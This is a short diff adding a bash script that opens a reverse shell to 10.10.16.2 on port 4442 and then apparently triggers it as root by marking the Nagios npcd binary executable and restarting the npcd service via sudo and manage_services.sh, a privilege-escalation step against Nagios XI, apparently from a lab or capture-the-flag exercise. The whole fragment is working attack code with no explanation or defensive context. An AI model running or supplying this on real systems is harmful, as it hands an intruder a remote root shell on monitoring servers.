@@ -1,0 +1,5 @@
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.16.2/4442 0>&1
+# -------
+chmod +x /usr/local/nagios/bin/npcd # Make it executable, so service can execute it
+sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
